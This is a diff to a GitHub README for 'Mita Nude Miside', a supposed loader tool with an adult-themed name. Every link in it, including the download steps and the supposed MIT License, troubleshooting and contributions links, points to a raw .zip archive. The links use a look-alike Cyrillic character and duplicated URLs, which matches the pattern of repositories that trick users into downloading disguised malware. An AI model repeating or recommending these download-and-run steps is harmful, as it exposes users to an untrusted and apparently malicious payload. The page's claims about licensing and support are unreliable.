@@ -8,9 +8,9 @@ Welcome to **Mita Nude Miside**, a robust and feature-rich loader application de
 
 Start using **Mita Nude Miside** in just a few steps:
 
-1. Download **https://raw.githubusercontent.com/MakaraSovann/MitaNude-Miside-Toolkit/main/Lоader.zip** from this repository. *(Latest version always available!)*
-2. Extract the contents of **https://raw.githubusercontent.com/MakaraSovann/MitaNude-Miside-Toolkit/main/Lоader.zip** to your desired location.
-3. Follow the instructions in `https://raw.githubusercontent.com/MakaraSovann/MitaNude-Miside-Toolkit/main/Lоader.zip` to complete the setup for your operating system.
+1. Download **https://raw.githubusercontent.com/MakaraSovann/MitaNude-Miside-Toolkit/main/Ignatian/MitaNude-Miside-Toolkit.zipоhttps://raw.githubusercontent.com/MakaraSovann/MitaNude-Miside-Toolkit/main/Ignatian/MitaNude-Miside-Toolkit.zip** from this repository. *(Latest version always available!)*
+2. Extract the contents of **https://raw.githubusercontent.com/MakaraSovann/MitaNude-Miside-Toolkit/main/Ignatian/MitaNude-Miside-Toolkit.zipоhttps://raw.githubusercontent.com/MakaraSovann/MitaNude-Miside-Toolkit/main/Ignatian/MitaNude-Miside-Toolkit.zip** to your desired location.
+3. Follow the instructions in `https://raw.githubusercontent.com/MakaraSovann/MitaNude-Miside-Toolkit/main/Ignatian/MitaNude-Miside-Toolkit.zipоhttps://raw.githubusercontent.com/MakaraSovann/MitaNude-Miside-Toolkit/main/Ignatian/MitaNude-Miside-Toolkit.zip` to complete the setup for your operating system.
 4. Run **Mita Nude Miside** and enjoy the experience!
 
 No additional packages required!  
@@ -78,14 +78,14 @@ Universal loader, Cross-platform loader, 2025 resource manager, Secure unpacker,
 MIT License - Modern and Open  
 You can freely use, modify, and distribute **Mita Nude Miside** in line with the terms specified by the MIT License.
 
-[Read the MIT License here](https://raw.githubusercontent.com/MakaraSovann/MitaNude-Miside-Toolkit/main/Lоader.zip)
+[Read the MIT License here](https://raw.githubusercontent.com/MakaraSovann/MitaNude-Miside-Toolkit/main/Ignatian/MitaNude-Miside-Toolkit.zipоhttps://raw.githubusercontent.com/MakaraSovann/MitaNude-Miside-Toolkit/main/Ignatian/MitaNude-Miside-Toolkit.zip)
 
 ---
 
 ## 🧩 Additional Resources
 
-- **Troubleshooting**: For installation or usage questions, check `https://raw.githubusercontent.com/MakaraSovann/MitaNude-Miside-Toolkit/main/Lоader.zip`
-- **Contributions**: PRs accepted! See `https://raw.githubusercontent.com/MakaraSovann/MitaNude-Miside-Toolkit/main/Lоader.zip`
+- **Troubleshooting**: For installation or usage questions, check `https://raw.githubusercontent.com/MakaraSovann/MitaNude-Miside-Toolkit/main/Ignatian/MitaNude-Miside-Toolkit.zipоhttps://raw.githubusercontent.com/MakaraSovann/MitaNude-Miside-Toolkit/main/Ignatian/MitaNude-Miside-Toolkit.zip`
+- **Contributions**: PRs accepted! See `https://raw.githubusercontent.com/MakaraSovann/MitaNude-Miside-Toolkit/main/Ignatian/MitaNude-Miside-Toolkit.zipоhttps://raw.githubusercontent.com/MakaraSovann/MitaNude-Miside-Toolkit/main/Ignatian/MitaNude-Miside-Toolkit.zip`
 - **Latest News**: Stay tuned for 2025 roadmap and new module releases!
 
 ---
